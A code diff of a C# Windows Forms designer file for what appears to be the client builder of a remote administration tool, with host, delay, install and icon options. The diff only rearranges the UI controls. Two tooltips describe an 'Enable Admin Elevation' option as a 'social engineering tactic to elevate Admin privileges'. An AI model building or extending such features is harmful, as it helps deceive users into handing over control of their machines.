@@ -42,8 +42,6 @@
             this.txtHost = new System.Windows.Forms.TextBox();
             this.lblHost = new System.Windows.Forms.Label();
             this.groupInstall = new System.Windows.Forms.GroupBox();
-            this.chkIconChange = new System.Windows.Forms.CheckBox();
-            this.chkElevation = new System.Windows.Forms.CheckBox();
             this.picUAC2 = new System.Windows.Forms.PictureBox();
             this.picUAC1 = new System.Windows.Forms.PictureBox();
             this.rbSystem = new System.Windows.Forms.RadioButton();
@@ -65,6 +63,8 @@
             this.txtInstallname = new System.Windows.Forms.TextBox();
             this.lblInstallname = new System.Windows.Forms.Label();
             this.chkInstall = new System.Windows.Forms.CheckBox();
+            this.chkIconChange = new System.Windows.Forms.CheckBox();
+            this.chkElevation = new System.Windows.Forms.CheckBox();
             this.btnBuild = new System.Windows.Forms.Button();
             this.tooltip = new System.Windows.Forms.ToolTip(this.components);
             this.groupAsmInfo = new System.Windows.Forms.GroupBox();
@@ -131,6 +131,7 @@
             this.txtDelay.Size = new System.Drawing.Size(66, 22);
             this.txtDelay.TabIndex = 8;
             this.txtDelay.Text = "5000";
+            this.txtDelay.TextChanged += new System.EventHandler(this.txtDelay_TextChanged);
             this.txtDelay.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtDelay_KeyPress);
             // 
             // lblDelay
@@ -236,30 +237,6 @@
             this.groupInstall.TabIndex = 1;
             this.groupInstall.TabStop = false;
             this.groupInstall.Text = "Install";
-            // 
-            // chkIconChange
-            // 
-            this.chkIconChange.AutoSize = true;
-            this.chkIconChange.Location = new System.Drawing.Point(6, 44);
-            this.chkIconChange.Name = "chkIconChange";
-            this.chkIconChange.Size = new System.Drawing.Size(91, 17);
-            this.chkIconChange.TabIndex = 1;
-            this.chkIconChange.Text = "Change Icon";
-            this.tooltip.SetToolTip(this.chkIconChange, "Custom social engineering tactic to elevate Admin privileges.");
-            this.chkIconChange.UseVisualStyleBackColor = true;
-            this.chkIconChange.CheckedChanged += new System.EventHandler(this.chkIconChange_CheckedChanged);
-            // 
-            // chkElevation
-            // 
-            this.chkElevation.AutoSize = true;
-            this.chkElevation.Location = new System.Drawing.Point(6, 21);
-            this.chkElevation.Name = "chkElevation";
-            this.chkElevation.Size = new System.Drawing.Size(147, 17);
-            this.chkElevation.TabIndex = 0;
-            this.chkElevation.Text = "Enable Admin Elevation";
-            this.tooltip.SetToolTip(this.chkElevation, "Custom social engineering tactic to elevate Admin privileges.");
-            this.chkElevation.UseVisualStyleBackColor = true;
-            this.chkElevation.CheckedChanged += new System.EventHandler(this.chkElevation_CheckedChanged);
             // 
             // picUAC2
             // 
@@ -471,6 +448,30 @@
             this.chkInstall.Text = "Install Client";
             this.chkInstall.UseVisualStyleBackColor = true;
             this.chkInstall.CheckedChanged += new System.EventHandler(this.chkInstall_CheckedChanged);
+            // 
+            // chkIconChange
+            // 
+            this.chkIconChange.AutoSize = true;
+            this.chkIconChange.Location = new System.Drawing.Point(6, 44);
+            this.chkIconChange.Name = "chkIconChange";
+            this.chkIconChange.Size = new System.Drawing.Size(91, 17);
+            this.chkIconChange.TabIndex = 1;
+            this.chkIconChange.Text = "Change Icon";
+            this.tooltip.SetToolTip(this.chkIconChange, "Custom social engineering tactic to elevate Admin privileges.");
+            this.chkIconChange.UseVisualStyleBackColor = true;
+            this.chkIconChange.CheckedChanged += new System.EventHandler(this.chkIconChange_CheckedChanged);
+            // 
+            // chkElevation
+            // 
+            this.chkElevation.AutoSize = true;
+            this.chkElevation.Location = new System.Drawing.Point(6, 21);
+            this.chkElevation.Name = "chkElevation";
+            this.chkElevation.Size = new System.Drawing.Size(147, 17);
+            this.chkElevation.TabIndex = 0;
+            this.chkElevation.Text = "Enable Admin Elevation";
+            this.tooltip.SetToolTip(this.chkElevation, "Custom social engineering tactic to elevate Admin privileges.");
+            this.chkElevation.UseVisualStyleBackColor = true;
+            this.chkElevation.CheckedChanged += new System.EventHandler(this.chkElevation_CheckedChanged);
             // 
             // btnBuild
             // 
